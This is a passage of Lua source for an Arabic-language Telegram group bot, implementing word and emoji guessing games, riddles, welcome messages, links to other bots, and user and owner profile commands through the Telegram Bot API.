name = string.gsub(name,"👨‍🔧","👩‍??👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧")
name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳")
name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀")
name = string.gsub(name,"🧝‍♂","🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀")
name = string.gsub(name,"🙍‍♂️","🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️")
name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️??‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️")
name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
name = string.gsub(name,"👨‍👨‍👧","👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍??‍👧👨‍👨‍👦👨‍👨‍👦")
name = string.gsub(name,"🕒","🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒")
name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
name = string.gsub(name,"📅","📆📆📆📆📆??📅📆📆")
return bot.sendText(msg.chat_id,msg.id,"*‹ : اسرع واحد يدز الاختلاف ~* ( ["..name.."] )","md",true)  
end
if text == "امثله" then
redis:del(bot_id..":"..msg.chat_id..":game:Example")
mthal = {"جوز","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
name = mthal[math.random(#mthal)]
redis:set(bot_id..":"..msg.chat_id..":game:Example",name)
name = string.gsub(name,"جوز","ينطي____للماعده سنون")
name = string.gsub(name,"ضراطه","الي يسوق المطي يتحمل___")
name = string.gsub(name,"بيدك","اكل___محد يفيدك")
name = string.gsub(name,"الحافي","تجدي من___نعال")
name = string.gsub(name,"شقره","مع الخيل يا___")
name = string.gsub(name,"النخله","الطول طول___والعقل عقل الصخلة")
name = string.gsub(name,"سلايه","بالوجه امراية وبالظهر___")
name = string.gsub(name,"الخيل","من قلة___شدو على الچلاب سروج")
name = string.gsub(name,"حداد","موكل من صخم وجهه كال آني___")
name = string.gsub(name,"المبلل","___ما يخاف من المطر")
name = string.gsub(name,"الحبل","اللي تلدغة الحية يخاف من جرة___")
name = string.gsub(name,"يركص","المايعرف___يكول الكاع عوجه")
name = string.gsub(name,"العنب","المايلوح___يكول حامض")
name = string.gsub(name,"العمه","___إذا حبت الچنة ابليس يدخل الجنة")
name = string.gsub(name,"الخبز","انطي___للخباز حتى لو ياكل نصه")
name = string.gsub(name,"باحصاد","اسمة___ومنجله مكسور")
name = string.gsub(name,"شهر","امشي__ولا تعبر نهر")
name = string.gsub(name,"شكه","يامن تعب يامن__يا من على الحاضر لكة")
name = string.gsub(name,"القرد","__بعين امه غزال")
name = string.gsub(name,"يكحله","اجه___عماها")
return bot.sendText(msg.chat_id,msg.id,"*‹ : اسرع واحد يكمل المثل~* ( ["..name.."] )","md",true)  
end
if text == "سمايلات" or text == "سمايل" then
redis:del(bot_id..":"..msg.chat_id..":game:Smile")
Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","⚔","🛡","🔮","🌡","💣","- ","📍","📓","📗","📂","📅","📪","📫","- ","📭","⏰","📺","🎚","☎️","📡"}
SM = Random[math.random(#Random)]
redis:set(bot_id..":"..msg.chat_id..":game:Smile",SM)
return bot.sendText(msg.chat_id,msg.id,"‹ : اسرع واحد يدز هاذا السمايل ?~ ( "..SM.."}","md",true)  
end
if text == "الاسرع" or text == "ترتيب" then
redis:del(bot_id..":"..msg.chat_id..":game:Monotonous")
KlamSpeed = {"سحور","سياره","استقبال","قنفذ","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","قهوه","سفينه","ريفور","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","سونيك","لعبه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
redis:set(bot_id..":"..msg.chat_id..":game:Monotonous",name)
name = string.gsub(name,"سحور","س ر و ح")
name = string.gsub(name,"سونيك","ي س ك ن ك")
name = string.gsub(name,"سياره","ه ر س ي ا")
name = string.gsub(name,"استقبال","ل ب ا ت ق س ا")
name = string.gsub(name,"قنفذ","ذ ق ن ف")
name = string.gsub(name,"ايفون","و ن ف ا")
name = string.gsub(name,"ريفور","ر و ف ر ي")
name = string.gsub(name,"مطبخ","خ ب ط م")
name = string.gsub(name,"كرستيانو","س ت ا ن و ك ر ي")
name = string.gsub(name,"دجاجه","ج ج ا د ه")
name = string.gsub(name,"مدرسه","ه م د ر س")
name = string.gsub(name,"الوان","ن ا و ا ل")
name = string.gsub(name,"غرفه","غ ه ر ف")
name = string.gsub(name,"ثلاجه","ج ه ت ل ا")
name = string.gsub(name,"قهوه","ه ق ه و")
name = string.gsub(name,"سفينه","ه ن ف ي س")
name = string.gsub(name,"محطه","ه ط م ح")
name = string.gsub(name,"طياره","ر ا ط ي ه")
name = string.gsub(name,"رادار","ر ا ر ا د")
name = string.gsub(name,"منزل","ن ز م ل")
name = string.gsub(name,"مستشفى","ى ش س ف ت م")
name = string.gsub(name,"كهرباء","ر ب ك ه ا ء")
name = string.gsub(name,"تفاحه","ح ه ا ت ف")
name = string.gsub(name,"اخطبوط","ط ب و ا خ ط")
name = string.gsub(name,"سلمون","ن م و ل س")
name = string.gsub(name,"فرنسا","ن ف ر س ا")
name = string.gsub(name,"برتقاله","ر ت ق ب ا ه ل")
name = string.gsub(name,"تفاح","ح ف ا ت")
name = string.gsub(name,"مطرقه","ه ط م ر ق")
name = string.gsub(name,"مصر","ص م ر")
name = string.gsub(name,"لعبه","ع ل ه ب")
name = string.gsub(name,"شباك","ب ش ا ك")
name = string.gsub(name,"باص","ص ا ب")
name = string.gsub(name,"سمكه","ك س م ه")
name = string.gsub(name,"ذباب","ب ا ب ذ")
name = string.gsub(name,"تلفاز","ت ف ل ز ا")
name = string.gsub(name,"حاسوب","س ا ح و ب")
name = string.gsub(name,"انترنت","ا ت ن ن  ر ت")
name = string.gsub(name,"ساحه","ح ا ه س")
name = string.gsub(name,"جسر","ر ج س")
return bot.sendText(msg.chat_id,msg.id,"‹ : اسرع واحد يرتبها~ ( ["..name.."] )","md",true)  
end
if text == "حزوره" then
redis:del(bot_id..":"..msg.chat_id..":game:Riddles")
Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
name = Hzora[math.random(#Hzora)]
redis:set(bot_id..":"..msg.chat_id..":game:Riddles",name)
name = string.gsub(name,"الجرس","شيئ اذا لمسته صرخ ما هوه ؟")
name = string.gsub(name,"عقرب الساعه","اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟")
name = string.gsub(name,"السمك","ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟")
name = string.gsub(name,"المطر","شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟")
name = string.gsub(name,"5","ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ")
name = string.gsub(name,"الكتاب","ما الشيئ الذي له اوراق وليس له جذور ؟")
name = string.gsub(name,"البسمار","ما هو الشيئ الذي لا يمشي الا بالضرب ؟")
name = string.gsub(name,"7","عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ")
name = string.gsub(name,"الكعبه","ما هو الشيئ الموجود وسط مكة ؟")
name = string.gsub(name,"بيت الشعر","ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ")
name = string.gsub(name,"لهانه","وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ")
name = string.gsub(name,"انا","ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟")
name = string.gsub(name,"امي","اخت خالك وليست خالتك من تكون ؟ ")
name = string.gsub(name,"الابره","ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ")
name = string.gsub(name,"الساعه","ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟")
name = string.gsub(name,"22","كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ")
name = string.gsub(name,"غلط","ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ")
name = string.gsub(name,"كم الساعه","ما هو السؤال الذي تختلف اجابته دائما ؟")
name = string.gsub(name,"البيتنجان","جسم اسود وقلب ابيض وراس اخظر فما هو ؟")
name = string.gsub(name,"البيض","ماهو الشيئ الذي اسمه على لونه ؟")
name = string.gsub(name,"المرايه","ارى كل شيئ من دون عيون من اكون ؟ ")
name = string.gsub(name,"الضوء","ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟")
name = string.gsub(name,"الهواء","ما هو الشيئ الذي يسير امامك ولا تراه ؟")
name = string.gsub(name,"الضل","ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ")
name = string.gsub(name,"العمر","ما هو الشيء الذي كلما طال قصر ؟ ")
name = string.gsub(name,"القلم","ما هو الشيئ الذي يكتب ولا يقرأ ؟")
name = string.gsub(name,"المشط","له أسنان ولا يعض ما هو ؟ ")
name = string.gsub(name,"الحفره","ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟")
name = string.gsub(name,"البحر","ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟")
name = string.gsub(name,"الثلج","انا ابن الماء فان تركوني في الماء مت فمن انا ؟")
name = string.gsub(name,"الاسفنج","كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟")
name = string.gsub(name,"الصوت","اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟")
name = string.gsub(name,"بلم","حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ")
return bot.sendText(msg.chat_id,msg.id,"*‹ : اسرع واحد يحل الحزوره*\n ( "..name.." )","md",true)  
end
if text == "معاني" then
redis:del(bot_id..":"..msg.chat_id..":game:Meaningof")
Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
name = Maany_Rand[math.random(#Maany_Rand)]
redis:set(bot_id..":"..msg.chat_id..":game:Meaningof",name)
name = string.gsub(name,"قرد","🐒")
name = string.gsub(name,"دجاجه","🐔")
name = string.gsub(name,"بطريق","🐧")
name = string.gsub(name,"ضفدع","🐸")
name = string.gsub(name,"بومه","🦉")
name = string.gsub(name,"نحله","🐝")
name = string.gsub(name,"ديك","🐓")
name = string.gsub(name,"جمل","🐫")
name = string.gsub(name,"بقره","🐄")
name = string.gsub(name,"دولفين","🐬")
name = string.gsub(name,"تمساح","🐊")
name = string.gsub(name,"قرش","🦈")
name = string.gsub(name,"نمر","🐅")
name = string.gsub(name,"اخطبوط","🐙")
name = string.gsub(name,"سمكه","🐟")
name = string.gsub(name,"خفاش","🦇")
name = string.gsub(name,"اسد","🦁")
name = string.gsub(name,"فأر","🐭")
name = string.gsub(name,"ذئب","🐺")
name = string.gsub(name,"فراشه","🦋")
name = string.gsub(name,"عقرب","🦂")
name = string.gsub(name,"زرافه","🦒")
name = string.gsub(name,"قنفذ","🦔")
name = string.gsub(name,"تفاحه","🍎")
name = string.gsub(name,"باذنجان","🍆")
return bot.sendText(msg.chat_id,msg.id,"‹ : اسرع واحد يدز معنى السمايل~ ( ["..name.."] )","md",true)  
end
if text == "العكس" then
redis:del(bot_id..":"..msg.chat_id..":game:Reflection")
katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
name = katu[math.random(#katu)]
redis:set(bot_id..":"..msg.chat_id..":game:Reflection",name)
name = string.gsub(name,"باي","هلو")
name = string.gsub(name,"فهمت","مافهمت")
name = string.gsub(name,"موزين","زين")
name = string.gsub(name,"اسمعك","ماسمعك")
name = string.gsub(name,"احبك","ماحبك")
name = string.gsub(name,"موحلو","حلو")
name = string.gsub(name,"نضيف","وصخ")
name = string.gsub(name,"حاره","بارده")
name = string.gsub(name,"و","عالي")
name = string.gsub(name,"جوه","فوك")
name = string.gsub(name,"سريع","بطيء")
name = string.gsub(name,"ونسه","ضوجه")
name = string.gsub(name,"طويل","قزم")
name = string.gsub(name,"سمين","ضعيف")
name = string.gsub(name,"ضعيف","قوي")
name = string.gsub(name,"شريف","كواد")
name = string.gsub(name,"شجاع","جبان")
name = string.gsub(name,"رحت","اجيت")
name = string.gsub(name,"عدل","ميت")
name = string.gsub(name,"نشيط","كسول")
name = string.gsub(name,"شبعان","جوعان")
name = string.gsub(name,"موعطشان","عطشان")
name = string.gsub(name,"خوش ولد","موخوش ولد")
name = string.gsub(name,"اني","مطي")
name = string.gsub(name,"هادئ","عصبي")
return bot.sendText(msg.chat_id,msg.id,"*‹ : اسرع واحد يدز العكس ~* ( ["..name.."])","md",true) 
end
end -- end tf
if text == 'القوانين' then
if redis:get(bot_id..":"..msg.chat_id..":Law") then
t = redis:get(bot_id..":"..msg.chat_id..":Law")
else
t = "*‹ : لم يتم وضع القوانين في المجموعه  .*"
end
bot.sendText(msg.chat_id,msg.id,t,"md", true)
end
if msg.content.luatele == "messageChatJoinByLink" then
if not redis:get(bot_id..":"..msg.chat_id..":settings:Welcome") then
local UserInfo = bot.getUser(msg.sender.user_id)
local tex = redis:get(bot_id..":"..msg.chat_id..":Welcome")
if UserInfo.username and UserInfo.username ~= "" then
User = "[@"..UserInfo.username.."]"
Usertag = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
else
User = "لا يوجد!"
Usertag = '['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')'
end
if tex then 
tex = tex:gsub('name',UserInfo.first_name) 
tex = tex:gsub('user',User) 
bot.sendText(msg.chat_id,msg.id,tex,"md")  
else
bot.sendText(msg.chat_id,msg.id,"*‹ : اطلق دخول عمري💘 :  .*"..Usertag..".","md")  
end
end
end
if text == 'بوت حذف' or text == 'رابط الحذف' or text == 'رابط حذف' or text == 'بوت الحذف' then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : Press here .',url="t.me/BI9BIBoT"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*‹ : Bot delete accounts 🗑️ .*',"md", true, false, false, false, reply_markup)
end
if text == 'همسه' or text == 'همسة' or text == 'بوت همسه' or text == 'بوت الهمسه' then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : hiss .',url="t.me/helUIbot"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*‹ : Bot hiss 🔐 .*',"md", true, false, false, false, reply_markup)
end
if text == 'يوتيوب' or text == 'يوت' or text == 'بوت يوتيوب' then  
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : Press here .',url="t.me/YlTIbot"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*‹ : Bot YouTube ⚙️ .*',"md", true, false, false, false, reply_markup)
end
if text == "الساعه" then
bot.sendText(msg.chat_id,msg.id,"*‹ : الساعه الان : ( "..os.date("%I:%M%p").." ) .*","md",true)  
end
if text == "شسمك" or text == "سنو اسمك" then
namet = {"اسمي "..(redis:get(bot_id..":namebot") or "لاريكا"),"عمريي اسمي "..(redis:get(bot_id..":namebot") or "لاريكا"),"اني لقميل "..(redis:get(bot_id..":namebot") or "لاريكا"),(redis:get(bot_id..":namebot") or "لاريكا").." اني"}
bot.sendText(msg.chat_id,msg.id,"*"..namet[math.random(#namet)].."*","md",true)  
end
if text == "بوت" or text == (redis:get(bot_id..":namebot") or "لاريكا") then
nameBot = {"ها حبي","ها سيد","كلي سيد","كلبي سيد","نعم تفضل ؟،","محتاج شي","عندي اسم وعيونك"}
bot.sendText(msg.chat_id,msg.id,"*"..nameBot[math.random(#nameBot)].."*","md",true)  
end
if text == "التاريخ" then
bot.sendText(msg.chat_id,msg.id,"*‹ : التاريخ الان : ( "..os.date("%Y/%m/%d").." ) .*","md",true)  
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:GetBio") then
if text == 'البايو' or text == 'نبذتي' or text == 'بايو' then
bot.sendText(msg.chat_id,msg.id,GetBio(msg.sender.user_id),"md",true)  
return false
end
end
if text == 'رفع المنشئ' or text == 'رفع المالك' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*‹ : البوت لا يمتلك صلاحيه .*","md",true)  
return false
end
local info_ = bot.getSupergroupMembers(msg.chat_id, "Administrators", " .*", 0, 200)
local list_ = info_.members
for k, v in pairs(list_) do
if info_.members[k].status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator", v.member_id.user_id)
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*","md",true)  
end
end
end
if text == 'المنشئ' or text == 'المالك' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*‹ : البوت لا يمتلك صلاحيه .*","md",true)  
return false
end
local info_ = bot.getSupergroupMembers(msg.chat_id, "Administrators", " .*", 0, 200)
local list_ = info_.members
for k, v in pairs(list_) do
if info_.members[k].status.luatele == "chatMemberStatusCreator" then
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.first_name == "" then
bot.sendText(msg.chat_id,msg.id,"*‹ : "..text.." حساب محذوف .*","md",true)  
return false
end
if UserInfo.username and UserInfo.username ~= "" then
t = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
u = '[@'..UserInfo.username..']'
ban = ' '..UserInfo.first_name..' '
else
t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
u = 'لا يوجد'
end
sm = bot.getChatMember(msg.chat_id,UserInfo.id)
if sm.status.custom_title then
if sm.status.custom_title ~= "" then
custom = sm.status.custom_title
else
custom = 'لا يوجد'
end
end
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المنشئ"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "المشرف"
else
gstatus = "العضو"
end
local photo = bot.getUserProfilePhotos(UserInfo.id)
if photo.total_count > 0 then
local TestText = "  *‹ : Name : *( "..(t).." *)*\n*‹ : User : *( "..(u).." *)*\n*‹ : Bio :* ["..GetBio(UserInfo.id).."]\n"
keyboardd = {}
keyboardd.inline_keyboard = {
{
{text = ban, url = "https://t.me/"..UserInfo.username..""},
},
}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
bot.sendText(msg.chat_id,msg.id,"*‹ : الاسم : *( "..(t).." *)*\n*‹ : المعرف : *( "..(u).." *)*\n["..GetBio(UserInfo.id).."]","md",true)  
end
end
end
end
if text == 'المطور' or text == 'مطور البوت' then
local UserInfo = bot.getUser(sudoid)
if UserInfo.username and UserInfo.username ~= "" then
t = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
ban = ' '..UserInfo.first_name..' '
u = '[@'..UserInfo.username..']'
else
t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
u = 'لا يوجد'
end
local photo = bot.getUserProfilePhotos(UserInfo.id)
if photo.total_count > 0 then
local TestText = "  *‹ : Name : *( "..(t).." *)*\n*‹ : User : *( "..(u).." *)*\n*‹ : Bio :* ["..GetBio(UserInfo.id).."]\n"
keyboardd = {}
keyboardd.inline_keyboard = {
{
{text = ban, url = "https://t.me/"..UserInfo.username..""},
},
}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
bot.sendText(msg.chat_id,msg.id,"*‹ : الاسم : *( "..(t).." *)*\n*‹ : المعرف : *( "..(u).." *)*\n["..GetBio(UserInfo.id).."]","md",true)  
end
end
if text == 'مطور السورس' or text == 'مبرمج السورس' or text == 'المبرمج' then
local UserId_Info = bot.searchPublicChat("sSs_sSs")
if UserId_Info.id then
local UserInfo = bot.getUser(UserId_Info.id)
if UserInfo.username and UserInfo.username ~= "" then
t = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
ban = ' '..UserInfo.first_name..' '
u = '[@'..UserInfo.username..']'
else
t = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
u = 'لا يوجد'
end
local photo = bot.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  *‹ : Name : *( "..(t).." *)*\n*‹ : User : *( "..(u).." *)*\n*‹ : Bio :* ["..GetBio(UserInfo.id).."]\n"
keyboardd = {}
keyboardd.inline_keyboard = {
{
{text = ban, url = "https://t.me/"..UserInfo.username..""},
},
}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
bot.sendText(msg.chat_id,msg.id,"*‹ : الاسم : *( "..(t).." *)*\n*‹ : المعرف : *( "..(u).." *)*\n["..GetBio(UserInfo.id).."]","md",true)  
end
end
end
if Owner(msg) then
if text == "تثبيت" and msg.reply_to_message_id ~= 0 then
if GetInfoBot(msg).PinMsg == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : ليس لدي صلاحيه تثبيت رسائل*',"md",true)  
return false
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تثبيت الرساله .*","md",true)
local Rmsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
bot.pinChatMessage(msg.chat_id,Rmsg.id,true)
end
end
if text == 'معلوماتي' or text == 'موقعي' or text == 'صلاحياتي' then
local UserInfo = bot.getUser(msg.sender.user_id)
local Statusm = bot.getChatMember(msg.chat_id,msg.sender.user_id).status.luatele
if Statusm == "chatMemberStatusCreator" then
StatusmC = 'منشئ'
elseif Statusm == "chatMemberStatusAdministrator" then
StatusmC = 'مشرف'
else
StatusmC = 'عضو'
end
if StatusmC == 'مشرف' then 
local GetMemberStatus = bot.getChatMember(msg.chat_id,msg.sender.user_id).status
if GetMemberStatus.can_change_info then
change_info = '✔️' else change_info = '❌'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '✔️' else delete_messages = '❌'
end
if GetMemberStatus.can_invite_users then
invite_users = '✔️' else invite_users = '❌'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '✔️' else pin_messages = '❌'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '✔️' else restrict_members = '❌'
end
if GetMemberStatus.can_promote_members then
promote = '✔️' else promote = '❌'
end
if StatusmC == "عضو" then
PermissionsUser = ' '
else
PermissionsUser = '*\n‹ : صلاحياتك هي :\n *ٴ━═━═━═━═━═━═━═━ *'..'\n‹ : تغيير المعلومات : '..change_info..'\n‹ : تثبيت الرسائل : '..pin_messages..'\n‹ : اضافه مستخدمين : '..invite_users..'\n‹ : مسح الرسائل : '..delete_messages..'\n‹ : حظر المستخدمين : '..restrict_members..'\n‹ : اضافه المشرفين : '..promote..'\n\n*'
end
end
local UserId = msg.sender.user_id
local Get_Rank =(Get_Rank(msg.sender.user_id,msg.chat_id))
local messageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1)
local EditmessageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0)
local Total_ms =Total_message((redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1))
if UserInfo.username and UserInfo.username ~= "" then
UserInfousername = '@'..UserInfo.username
else
UserInfousername = 'لا يوجد'
end
bot.sendText(msg.chat_id,msg.id,'\n*‹ : ايديك : '..UserId..'\n‹ : معرفك : '..UserInfousername..'\n‹ : ‍رتبتك : '..Get_Rank..'\n‹ : موقعك : '..StatusmC..'\n‹ : رسائلك : '..messageC..'\n‹ : تعديلاتك : '..EditmessageC..'\n‹ : تفاعلك : '..Total_ms..'*'..(PermissionsUser or '') ,"md",true) 
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:id") then
if text == "ايدي" and msg.reply_to_message_id == 0 then
local Get_Rank =(Get_Rank(msg.sender.user_id,msg.chat_id))
local messageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1)
local gameC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0)
local Addedmem =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem") or 0)
local EditmessageC =(redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0)
local Total_ms =Total_message((redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1))
local photo = bot.getUserProfilePhotos(msg.sender.user_id)
local TotalPhoto = photo.total_count or 0
local UserInfo = bot.getUser(msg.sender.user_id)
local Texting = {
'*‹ : *صورتك فدشي 😘😔❤️',
"*‹ : *صارلك شكد مخليه ",
"*‹ : *وفالله 😔💘",
"*‹ : *كشخه برب 😉💘",
"*‹ : *دغيره شبي هذ 😒",
"*‹ : *عمري الحلوين 💘",
}
local Description = Texting[math.random(#Texting)]
if UserInfo.username and UserInfo.username ~= "" then
UserInfousername ="[@"..UserInfo.username.."]"
else
UserInfousername = 'لا يوجد'
end
if redis:get(bot_id..":"..msg.chat_id..":id") then
theId = redis:get(bot_id..":"..msg.chat_id..":id") 
theId = theId:gsub('#AddMem',Addedmem) 
theId = theId:gsub('#game',gameC) 
theId = theId:gsub('#id',msg.sender.user_id) 
theId = theId:gsub('#username',UserInfousername) 
theId = theId:gsub('#msgs',messageC) 
theId = theId:gsub('#edit',EditmessageC) 
theId = theId:gsub('#stast',Get_Rank) 
theId = theId:gsub('#auto',Total_ms) 
theId = theId:gsub('#Description',Description) 
theId = theId:gsub('#photos',TotalPhoto) 
else
theId = Description.."\n*‹ : الايدي : (* "..msg.sender.user_id.."* )\n‹ : المعرف :* ( "..UserInfousername.." )\n*‹ : الرتبه : (  "..Get_Rank.." )\n‹ : تفاعلك : (  "..Total_ms.." )\n‹ : عدد الرسائل : ( "..messageC.." )\n‹ : عدد السحكات : ( "..EditmessageC.." )\n‹ : عدد صورك : ( "..TotalPhoto.."* )"
end
if redis:get(bot_id..":"..msg.chat_id..":settings:id:ph") then
bot.sendText(msg.chat_id,msg.id,theId,"md",true) 
return false
end
if photo.total_count > 0 then
return bot.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,theId,"md")
else
return bot.sendText(msg.chat_id,msg.id,theId,"md",true) 
end
end
end
if text == 'تاك للكل' and Administrator(msg) then
local Info = bot.searchChatMembers(msg.chat_id, " .*", 200)
local members = Info.members
ls = '\n*‹ : قائمه الاعضاء \n ٴ━═━═━═━═━═━═━═━ *\n'
for k, v in pairs(members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.username and UserInfo.username ~= "" then
ls = ls..'*'..k..' - *@['..UserInfo.username..']\n'
else
ls = ls..'*'..k..' - *['..UserInfo.first_name..'](tg://user?id='..v.member_id.user_id..')\n'
end
end
bot.sendText(msg.chat_id,msg.id,ls,"md",true)  
end
if text and text:match('^ايدي @(%S+)$') or text and text:match('^كشف @(%S+)$') then
local UserName = text:match('^ايدي @(%S+)$') or text:match('^كشف @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
